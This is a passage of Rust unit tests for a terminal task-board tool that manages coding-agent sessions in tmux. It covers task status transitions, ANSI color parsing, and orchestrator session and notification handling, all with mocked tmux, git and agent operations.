#[cfg(feature = "test-mocks")]
fn test_execute_transition_request_move_forward_backlog_to_planning() {
    // move_forward on a Backlog task → calls transition_to_planning (spawns setup, returns Ok)
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("Plan this", "claude", "test-project");
    task.id = "t1".to_string();
    task.plugin = Some("agtx".to_string());
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    let req = crate::db::TransitionRequest::new("t1", "move_forward");
    let result = app.execute_transition_request(&req);
    assert!(result.is_ok());
    // setup_rx should be set (planning setup spawned)
    assert!(app.state.setup_rx.is_some());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_execute_transition_request_move_to_running_from_wrong_status_errors() {
    // move_to_running when task is in Review → should error
    let mut app = make_test_app();
    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("My task", "claude", "test-project");
    task.id = "t1".to_string();
    task.status = TaskStatus::Review;
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    let req = crate::db::TransitionRequest::new("t1", "move_to_running");
    let result = app.execute_transition_request(&req);
    assert!(result.is_err());
    assert!(result
        .unwrap_err()
        .to_string()
        .contains("Backlog or Planning"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_execute_transition_request_move_to_done_from_wrong_status_errors() {
    let mut app = make_test_app();
    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("My task", "claude", "test-project");
    task.id = "t1".to_string();
    task.status = TaskStatus::Planning; // not Review
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    let req = crate::db::TransitionRequest::new("t1", "move_to_done");
    let result = app.execute_transition_request(&req);
    assert!(result.is_err());
    assert!(result
        .unwrap_err()
        .to_string()
        .contains("Review to move to Done"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_execute_transition_request_resume_wrong_status_errors() {
    let mut app = make_test_app();
    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("My task", "claude", "test-project");
    task.id = "t1".to_string();
    task.status = TaskStatus::Running; // not Review
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    let req = crate::db::TransitionRequest::new("t1", "resume");
    let result = app.execute_transition_request(&req);
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("Review to resume"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_execute_transition_request_resume_moves_review_to_running() {
    // "resume" on a Review task → moves to Running
    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(MockTmuxOperations::new()),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("Resume me", "claude", "test-project");
    task.id = "t1".to_string();
    task.status = TaskStatus::Review;
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    let req = crate::db::TransitionRequest::new("t1", "resume");
    app.execute_transition_request(&req).unwrap();

    let updated = app
        .state
        .db
        .as_ref()
        .unwrap()
        .get_task("t1")
        .unwrap()
        .unwrap();
    assert_eq!(updated.status, TaskStatus::Running);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_execute_transition_request_move_to_done_calls_force_move() {
    // "move_to_done" on a Review task → force moves it to Done
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_kill_window().returning(|_| Ok(()));
    let mut mock_git = MockGitOperations::new();
    mock_git.expect_remove_worktree().returning(|_, _| Ok(()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(mock_git),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    let db = app.state.db.as_ref().unwrap();
    let mut task = Task::new("Done task", "claude", "test-project");
    task.id = "t1".to_string();
    task.status = TaskStatus::Review;
    db.create_task(&task).unwrap();
    app.refresh_tasks().unwrap();

    let req = crate::db::TransitionRequest::new("t1", "move_to_done");
    app.execute_transition_request(&req).unwrap();

    let updated = app
        .state
        .db
        .as_ref()
        .unwrap()
        .get_task("t1")
        .unwrap()
        .unwrap();
    assert_eq!(updated.status, TaskStatus::Done);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_process_transition_requests_marks_processed() {
    // After processing, request should be marked processed in the DB
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_kill_window().returning(|_| Ok(()));
    let mut mock_git = MockGitOperations::new();
    mock_git.expect_remove_worktree().returning(|_, _| Ok(()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(mock_git),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(MockAgentRegistry::new()),
    )
    .unwrap();

    {
        let db = app.state.db.as_ref().unwrap();
        let mut task = Task::new("Process me", "claude", "test-project");
        task.id = "t1".to_string();
        task.status = TaskStatus::Review;
        db.create_task(&task).unwrap();

        // Queue a transition request
        let req = crate::db::TransitionRequest::new("t1", "move_to_done");
        db.create_transition_request(&req).unwrap();

        // Should have 1 pending
        assert_eq!(db.get_pending_transition_requests().unwrap().len(), 1);
    }

    app.refresh_tasks().unwrap();
    app.process_transition_requests().unwrap();

    // Should have 0 pending (request was processed)
    assert_eq!(
        app.state
            .db
            .as_ref()
            .unwrap()
            .get_pending_transition_requests()
            .unwrap()
            .len(),
        0
    );
}

// =============================================================================
// Tests for parse_ansi_to_lines and parse_sgr
// =============================================================================

#[test]
fn test_parse_ansi_plain_text() {
    let input = b"Hello, world!";
    let lines = parse_ansi_to_lines(input);
    assert_eq!(lines.len(), 1);
    assert_eq!(lines[0].spans.len(), 1);
    assert_eq!(lines[0].spans[0].content, "Hello, world!");
}

#[test]
fn test_parse_ansi_empty_input() {
    let lines = parse_ansi_to_lines(b"");
    assert!(lines.is_empty());
}

#[test]
fn test_parse_ansi_multiline() {
    let lines = parse_ansi_to_lines(b"line1\nline2\nline3");
    assert_eq!(lines.len(), 3);
    assert_eq!(lines[0].spans[0].content, "line1");
    assert_eq!(lines[1].spans[0].content, "line2");
    assert_eq!(lines[2].spans[0].content, "line3");
}

#[test]
fn test_parse_ansi_empty_line_produces_empty_line_struct() {
    // A line with only an escape sequence (no text) → empty Line
    let input = b"\x1b[0m";
    let lines = parse_ansi_to_lines(input);
    assert_eq!(lines.len(), 1);
    // Empty span list renders as blank line
    assert!(lines[0].spans.is_empty());
}

#[test]
fn test_parse_ansi_reset_sequence() {
    // ESC[0m should reset style
    let input = b"\x1b[31mred\x1b[0mnormal";
    let lines = parse_ansi_to_lines(input);
    assert_eq!(lines.len(), 1);
    let spans = &lines[0].spans;
    assert_eq!(spans.len(), 2);
    assert_eq!(spans[0].content, "red");
    assert_eq!(spans[0].style.fg, Some(Color::Red));
    assert_eq!(spans[1].content, "normal");
    assert_eq!(spans[1].style.fg, None); // reset
}

#[test]
fn test_parse_ansi_bold() {
    let input = b"\x1b[1mbold text\x1b[0m";
    let lines = parse_ansi_to_lines(input);
    assert_eq!(lines.len(), 1);
    assert_eq!(lines[0].spans[0].content, "bold text");
    assert!(lines[0].spans[0]
        .style
        .add_modifier
        .contains(ratatui::style::Modifier::BOLD));
}

#[test]
fn test_parse_ansi_foreground_colors() {
    // Basic 3/4-bit foreground colors
    let cases: &[(&[u8], Color)] = &[
        (b"\x1b[31mX", Color::Red),
        (b"\x1b[32mX", Color::Green),
        (b"\x1b[33mX", Color::Yellow),
        (b"\x1b[34mX", Color::Blue),
        (b"\x1b[35mX", Color::Magenta),
        (b"\x1b[36mX", Color::Cyan),
    ];
    for (input, expected_color) in cases {
        let lines = parse_ansi_to_lines(input);
        assert_eq!(
            lines[0].spans[0].style.fg,
            Some(*expected_color),
            "input: {:?}",
            input
        );
    }
}

#[test]
fn test_parse_ansi_256_color() {
    // ESC[38;5;200m → Color::Indexed(200)
    let input = b"\x1b[38;5;200mcolored";
    let lines = parse_ansi_to_lines(input);
    assert_eq!(lines[0].spans[0].style.fg, Some(Color::Indexed(200)));
}

#[test]
fn test_parse_ansi_rgb_color() {
    // ESC[38;2;10;20;30m → Color::Rgb(10,20,30)
    let input = b"\x1b[38;2;10;20;30mrgb";
    let lines = parse_ansi_to_lines(input);
    assert_eq!(lines[0].spans[0].style.fg, Some(Color::Rgb(10, 20, 30)));
}

#[test]
fn test_parse_ansi_background_color() {
    // ESC[42m → bg Green
    let input = b"\x1b[42mtext";
    let lines = parse_ansi_to_lines(input);
    assert_eq!(lines[0].spans[0].style.bg, Some(Color::Green));
}

#[test]
fn test_parse_sgr_empty_resets() {
    // ESC[m with empty sequence → reset
    let style = ratatui::style::Style::default().fg(Color::Red).bold();
    let result = parse_sgr("", style);
    assert_eq!(result, ratatui::style::Style::default());
}

#[test]
fn test_parse_sgr_multiple_codes() {
    // "1;31" → bold + red foreground
    let style = parse_sgr("1;31", ratatui::style::Style::default());
    assert_eq!(style.fg, Some(Color::Red));
    assert!(style.add_modifier.contains(ratatui::style::Modifier::BOLD));
}

#[test]
fn test_parse_sgr_256_bg() {
    // "48;5;100" → bg Indexed(100)
    let style = parse_sgr("48;5;100", ratatui::style::Style::default());
    assert_eq!(style.bg, Some(Color::Indexed(100)));
}

#[test]
fn test_parse_sgr_rgb_bg() {
    // "48;2;5;10;15" → bg Rgb(5,10,15)
    let style = parse_sgr("48;2;5;10;15", ratatui::style::Style::default());
    assert_eq!(style.bg, Some(Color::Rgb(5, 10, 15)));
}

#[test]
fn test_parse_sgr_dim_italic_underline() {
    let style = parse_sgr("2;3;4", ratatui::style::Style::default());
    assert!(style.add_modifier.contains(ratatui::style::Modifier::DIM));
    assert!(style
        .add_modifier
        .contains(ratatui::style::Modifier::ITALIC));
    assert!(style
        .add_modifier
        .contains(ratatui::style::Modifier::UNDERLINED));
}

#[test]
fn test_parse_sgr_bright_colors() {
    // 90..97 are bright/dark foreground variants
    let style = parse_sgr("90", ratatui::style::Style::default());
    assert_eq!(style.fg, Some(Color::DarkGray));
    let style = parse_sgr("91", ratatui::style::Style::default());
    assert_eq!(style.fg, Some(Color::LightRed));
    let style = parse_sgr("97", ratatui::style::Style::default());
    assert_eq!(style.fg, Some(Color::White));
}

#[test]
fn test_parse_ansi_mixed_text_and_colors() {
    // "normal \x1b[32mgreen\x1b[0m after"
    let input = b"normal \x1b[32mgreen\x1b[0m after";
    let lines = parse_ansi_to_lines(input);
    assert_eq!(lines.len(), 1);
    let spans = &lines[0].spans;
    assert_eq!(spans.len(), 3);
    assert_eq!(spans[0].content, "normal ");
    assert_eq!(spans[1].content, "green");
    assert_eq!(spans[1].style.fg, Some(Color::Green));
    assert_eq!(spans[2].content, " after");
    assert_eq!(spans[2].style.fg, None);
}

// =============================================================================
// Tests for start_research and move_backlog_to_running_by_id
// =============================================================================

/// Build a test App with a task already in the DB and board, plus configurable mocks.
#[cfg(feature = "test-mocks")]
fn make_app_with_task(
    task: &Task,
    mock_tmux: MockTmuxOperations,
    mock_git: MockGitOperations,
) -> App {
    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(mock_git),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    app.state.db.as_ref().unwrap().create_task(task).unwrap();
    app.refresh_tasks().unwrap();
    app
}

// --- start_research ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_start_research_returns_early_if_setup_in_progress() {
    let mock_tmux = MockTmuxOperations::new();
    let task = make_test_task("r1", "Research task", TaskStatus::Backlog);
    let mut app = make_app_with_task(&task, mock_tmux, MockGitOperations::new());

    // Pre-set setup_rx to simulate in-progress setup
    let (_tx, rx) = std::sync::mpsc::channel::<SetupResult>();
    app.state.setup_rx = Some(rx);

    app.start_research("r1").unwrap();

    // setup_rx should still be set (wasn't cleared or replaced)
    assert!(app.state.setup_rx.is_some());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_start_research_warns_when_plugin_has_no_research_command() {
    let mock_tmux = MockTmuxOperations::new();
    let task = make_test_task("r2", "Research task", TaskStatus::Backlog);
    let mut app = make_app_with_task(&task, mock_tmux, MockGitOperations::new());
    // start_research stamps plugin from config.workflow_plugin — set openspec which has no research cmd
    app.state.config.workflow_plugin = Some("openspec".to_string());

    app.start_research("r2").unwrap();

    assert!(app.state.warning_message.is_some());
    assert!(app.state.setup_rx.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_start_research_spawns_setup_rx_for_valid_task() {
    let mock_tmux = MockTmuxOperations::new();
    let mut task = make_test_task("r3", "Research task", TaskStatus::Backlog);
    // agtx plugin has a research command
    task.plugin = Some("agtx".to_string());
    let mut app = make_app_with_task(&task, mock_tmux, MockGitOperations::new());

    app.start_research("r3").unwrap();

    // Background thread spawned → setup_rx set
    assert!(app.state.setup_rx.is_some());
    assert!(app.state.warning_message.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_start_research_returns_early_for_missing_task() {
    let mock_tmux = MockTmuxOperations::new();
    let task = make_test_task("r4", "Research task", TaskStatus::Backlog);
    let mut app = make_app_with_task(&task, mock_tmux, MockGitOperations::new());

    // Call with a task ID that doesn't exist in DB
    app.start_research("nonexistent-id").unwrap();

    assert!(app.state.setup_rx.is_none());
    assert!(app.state.warning_message.is_none());
}

// --- move_backlog_to_running_by_id ---

#[test]
#[cfg(feature = "test-mocks")]
fn test_move_backlog_to_running_returns_error_if_setup_in_progress() {
    let mock_tmux = MockTmuxOperations::new();
    let task = make_test_task("m1", "Running task", TaskStatus::Backlog);
    let mut app = make_app_with_task(&task, mock_tmux, MockGitOperations::new());

    let (_tx, rx) = std::sync::mpsc::channel::<SetupResult>();
    app.state.setup_rx = Some(rx);

    let result = app.move_backlog_to_running_by_id("m1");
    assert!(result.is_err());
    let msg = result.unwrap_err().to_string();
    assert!(msg.contains("already in progress"), "unexpected: {}", msg);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_move_backlog_to_running_errors_for_non_backlog_task() {
    let mock_tmux = MockTmuxOperations::new();
    let task = make_test_task("m2", "Running task", TaskStatus::Planning);
    let mut app = make_app_with_task(&task, mock_tmux, MockGitOperations::new());

    let result = app.move_backlog_to_running_by_id("m2");
    assert!(result.is_err());
    let msg = result.unwrap_err().to_string();
    assert!(msg.contains("Backlog"), "unexpected: {}", msg);
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_move_backlog_to_running_warns_when_prior_phase_required() {
    let mock_tmux = MockTmuxOperations::new();
    let mut task = make_test_task("m3", "Running task", TaskStatus::Backlog);
    // gsd running phase has no {task} in prompt → requires prior artifact
    task.plugin = Some("gsd".to_string());
    task.worktree_path = None; // no prior artifact
    let mut app = make_app_with_task(&task, mock_tmux, MockGitOperations::new());

    app.move_backlog_to_running_by_id("m3").unwrap();

    assert!(app.state.warning_message.is_some());
    assert!(app.state.setup_rx.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_move_backlog_to_running_stamps_plugin_from_config() {
    let mock_tmux = MockTmuxOperations::new();
    let mut task = make_test_task("m4", "Running task", TaskStatus::Backlog);
    // task has no plugin set — should be stamped from config
    task.plugin = None;
    let mut app = make_app_with_task(&task, mock_tmux, MockGitOperations::new());
    // agtx running phase accepts {task} directly → no blocking
    app.state.config.workflow_plugin = Some("agtx".to_string());

    app.move_backlog_to_running_by_id("m4").unwrap();

    // setup_rx spawned means plugin was stamped and setup started
    assert!(app.state.setup_rx.is_some());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_move_backlog_to_running_spawns_setup_rx_for_agtx_plugin() {
    let mock_tmux = MockTmuxOperations::new();
    let mut task = make_test_task("m5", "Running task", TaskStatus::Backlog);
    task.plugin = Some("agtx".to_string());
    let mut app = make_app_with_task(&task, mock_tmux, MockGitOperations::new());

    app.move_backlog_to_running_by_id("m5").unwrap();

    assert!(app.state.setup_rx.is_some());
    assert!(app.state.warning_message.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_move_backlog_to_running_returns_ok_for_missing_task() {
    let mock_tmux = MockTmuxOperations::new();
    let task = make_test_task("m6", "Running task", TaskStatus::Backlog);
    let mut app = make_app_with_task(&task, mock_tmux, MockGitOperations::new());

    // Nonexistent task ID → silently returns Ok(())
    app.move_backlog_to_running_by_id("nonexistent").unwrap();

    assert!(app.state.setup_rx.is_none());
}

// =============================================================================
// Tests for check_orchestrator_idle (pure function)
// =============================================================================

#[test]
fn test_check_orchestrator_idle_signal_in_changed_content() {
    // Content changed AND contains [agtx:idle] → Idle
    let result = check_orchestrator_idle("new content [agtx:idle]", "old content", None);
    assert!(matches!(result, OrchestratorIdleResult::Idle));
}

#[test]
fn test_check_orchestrator_idle_busy_when_content_changed_no_signal() {
    // Content changed, no idle signal → Busy
    let result = check_orchestrator_idle("new content", "old content", None);
    assert!(matches!(result, OrchestratorIdleResult::Busy));
}

#[test]
fn test_check_orchestrator_idle_waiting_when_unchanged_no_timer() {
    // Content unchanged, no stable_since set → Waiting
    let result = check_orchestrator_idle("same", "same", None);
    assert!(matches!(result, OrchestratorIdleResult::Waiting));
}

#[test]
fn test_check_orchestrator_idle_waiting_when_unchanged_timer_not_elapsed() {
    // Content unchanged, timer started just now → Waiting
    let stable_since = Some(Instant::now());
    let result = check_orchestrator_idle("same", "same", stable_since);
    assert!(matches!(result, OrchestratorIdleResult::Waiting));
}

#[test]
fn test_check_orchestrator_idle_idle_when_stable_for_15s() {
    // Content unchanged, timer elapsed ≥15s → Idle
    let stable_since = Some(Instant::now() - std::time::Duration::from_secs(20));
    let result = check_orchestrator_idle("same", "same", stable_since);
    assert!(matches!(result, OrchestratorIdleResult::Idle));
}

// =============================================================================
// Tests for toggle_orchestrator
// =============================================================================

#[test]
#[cfg(feature = "test-mocks")]
fn test_toggle_orchestrator_warns_in_dashboard_mode() {
    // No project path → sets warning, no session spawned
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    mock_tmux.expect_has_session().returning(|_| false);

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        None, // dashboard mode — no project path
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    app.toggle_orchestrator().unwrap();

    assert!(app.state.warning_message.is_some());
    assert!(app.state.orchestrator_session.is_none());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_toggle_orchestrator_spawns_new_session() {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    mock_tmux.expect_has_session().returning(|_| false);
    mock_tmux.expect_create_session().returning(|_, _| Ok(()));
    mock_tmux
        .expect_create_window()
        .withf(
            |_session,
             window_name,
             _dir,
             _cmd,
             keep_shell_on_exit: &bool,
             _env: &[(String, String)]| {
                window_name == "orchestrator" && !keep_shell_on_exit
            },
        )
        .returning(|_, _, _, _, _, _| Ok(()));
    mock_tmux.expect_resize_window().returning(|_, _, _| Ok(()));
    mock_tmux
        .expect_capture_pane_with_history()
        .returning(|_, _| vec![]);
    mock_tmux.expect_pane_metrics().returning(|_| None);

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry.expect_get().returning(|_| {
        let mut ops = MockAgentOperations::new();
        ops.expect_build_orchestrator_command()
            .returning(|_, _| "claude".to_string());
        Arc::new(ops)
    });

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    app.toggle_orchestrator().unwrap();

    assert!(app.state.orchestrator_session.is_some());
    assert!(app.state.warning_message.is_none());
    // Shell popup should be opened to show the starting orchestrator
    assert!(app.state.shell_popup.is_some());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_toggle_orchestrator_opens_popup_when_already_running() {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(true));
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("claude".to_string()));
    mock_tmux.expect_resize_window().returning(|_, _, _| Ok(()));
    mock_tmux
        .expect_capture_pane_with_history()
        .returning(|_, _| vec![]);
    mock_tmux.expect_pane_metrics().returning(|_| None);

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    // Simulate already-running orchestrator
    app.state.orchestrator_session = Some("test-project:orchestrator".to_string());

    app.toggle_orchestrator().unwrap();

    // Should open the popup, not spawn a new session
    assert!(app.state.shell_popup.is_some());
    // Session stays the same
    assert_eq!(
        app.state.orchestrator_session.as_deref(),
        Some("test-project:orchestrator")
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_toggle_orchestrator_reattaches_to_live_orchestrator_from_other_instance() {
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux
        .expect_window_exists()
        .withf(|t| t == "test-project:orchestrator")
        .returning(|_| Ok(true));
    mock_tmux
        .expect_pane_current_command()
        .withf(|t| t == "test-project:orchestrator")
        .returning(|_| Some("claude".to_string()));
    mock_tmux
        .expect_capture_pane()
        .withf(|t| t == "test-project:orchestrator")
        .returning(|_| Ok("Claude Code\n".to_string()));
    mock_tmux.expect_resize_window().returning(|_, _, _| Ok(()));
    mock_tmux
        .expect_capture_pane_with_history()
        .returning(|_, _| vec![]);
    mock_tmux.expect_pane_metrics().returning(|_| None);

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    assert!(app.state.orchestrator_session.is_none());

    app.toggle_orchestrator().unwrap();

    assert!(app.state.shell_popup.is_some());
    assert_eq!(
        app.state.orchestrator_session.as_deref(),
        Some("test-project:orchestrator")
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_toggle_orchestrator_clears_stale_session_and_respawns() {
    // orchestrator_session set but window is GONE → clears session, spawns new one
    let mut mock_tmux = MockTmuxOperations::new();
    // First call: check existing session → gone
    // Then: has_session, create_session, create_window, resize, capture for new spawn
    mock_tmux.expect_window_exists().returning(|_| Ok(false));
    mock_tmux.expect_has_session().returning(|_| false);
    mock_tmux.expect_create_session().returning(|_, _| Ok(()));
    // Respawn must keep `keep_shell_on_exit=false` — else zombie shell on exit.
    mock_tmux
        .expect_create_window()
        .withf(
            |_session,
             window_name,
             _dir,
             _cmd,
             keep_shell_on_exit: &bool,
             _env: &[(String, String)]| {
                window_name == "orchestrator" && !keep_shell_on_exit
            },
        )
        .returning(|_, _, _, _, _, _| Ok(()));
    mock_tmux.expect_resize_window().returning(|_, _, _| Ok(()));
    mock_tmux
        .expect_capture_pane_with_history()
        .returning(|_, _| vec![]);
    mock_tmux.expect_pane_metrics().returning(|_| None);

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry.expect_get().returning(|_| {
        let mut ops = MockAgentOperations::new();
        ops.expect_build_orchestrator_command()
            .returning(|_, _| "claude".to_string());
        Arc::new(ops)
    });

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    // Stale session — window no longer exists
    app.state.orchestrator_session = Some("test-project:orchestrator".to_string());

    app.toggle_orchestrator().unwrap();

    // New session should be set (different value possible, but must be Some)
    assert!(app.state.orchestrator_session.is_some());
    assert!(app.state.shell_popup.is_some());
}

// =============================================================================
// Tests for deliver_orchestrator_notifications
// =============================================================================

#[test]
#[cfg(feature = "test-mocks")]
fn test_deliver_orchestrator_notifications_throttled() {
    // Called immediately after reset → should return early (< 2s elapsed)
    let mut mock_tmux = MockTmuxOperations::new();
    // send_keys must NOT be called — any call would panic with mockall
    mock_tmux.expect_window_exists().returning(|_| Ok(true));
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok("[agtx:idle]".to_string()));

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    app.state.orchestrator_session = Some("proj:orchestrator".to_string());
    app.state.orchestrator_ready.store(true, Ordering::Release);
    // last_check was just set in new_for_test → throttled
    app.state.orchestrator_last_check = Instant::now();

    // Should be a no-op (throttle)
    app.deliver_orchestrator_notifications();
    // Nothing sent — test passes if no panic from unexpected mock calls
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_deliver_orchestrator_notifications_returns_early_no_session() {
    // No orchestrator_session → returns immediately
    let mock_tmux = MockTmuxOperations::new();
    // window_exists must NOT be called

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    // Expire the throttle
    app.state.orchestrator_last_check = Instant::now() - std::time::Duration::from_secs(10);
    // No session set
    app.state.orchestrator_session = None;

    app.deliver_orchestrator_notifications();
    // No panic = correct
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_deliver_orchestrator_notifications_returns_early_not_ready() {
    // Session set but orchestrator_ready = false → returns before window check
    let mock_tmux = MockTmuxOperations::new();
    // window_exists must NOT be called

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    app.state.orchestrator_last_check = Instant::now() - std::time::Duration::from_secs(10);
    app.state.orchestrator_session = Some("proj:orchestrator".to_string());
    app.state.orchestrator_ready.store(false, Ordering::Release);

    app.deliver_orchestrator_notifications();
    // No panic = correct
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_deliver_orchestrator_notifications_busy_when_content_changed() {
    // Content changed, no idle signal → state updated to Busy (stable_since set), nothing sent
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(true));
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("claude".to_string()));
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok("new content here".to_string()));
    // send_keys must NOT be called

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    app.state.orchestrator_last_check = Instant::now() - std::time::Duration::from_secs(10);
    app.state.orchestrator_session = Some("proj:orchestrator".to_string());
    app.state.orchestrator_ready.store(true, Ordering::Release);
    app.state.orchestrator_last_content = "old content".to_string();

    app.deliver_orchestrator_notifications();

    // stable_since should be set (Busy path resets timer)
    assert!(app.state.orchestrator_stable_since.is_some());
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_deliver_orchestrator_notifications_delivers_when_idle_signal() {
    // Content changed AND has [agtx:idle] → sends combined notification
    let mut mock_tmux = MockTmuxOperations::new();
    mock_tmux.expect_window_exists().returning(|_| Ok(true));
    mock_tmux
        .expect_pane_current_command()
        .returning(|_| Some("claude".to_string()));
    mock_tmux
        .expect_capture_pane()
        .returning(|_| Ok("stuff [agtx:idle]".to_string()));
    mock_tmux
        .expect_send_keys()
        .withf(|_target, msg| msg.starts_with("[agtx]"))
        .times(1)
        .returning(|_, _| Ok(()));

    let mut mock_registry = MockAgentRegistry::new();
    mock_registry
        .expect_get()
        .returning(|_| Arc::new(MockAgentOperations::new()));

    let mut app = App::new_for_test(
        Some(PathBuf::from("/tmp/test-project")),
        Arc::new(mock_tmux),
        Arc::new(MockGitOperations::new()),
        Arc::new(MockGitProviderOperations::new()),
        Arc::new(mock_registry),
    )
    .unwrap();

    app.state.orchestrator_last_check = Instant::now() - std::time::Duration::from_secs(10);
    app.state.orchestrator_session = Some("proj:orchestrator".to_string());
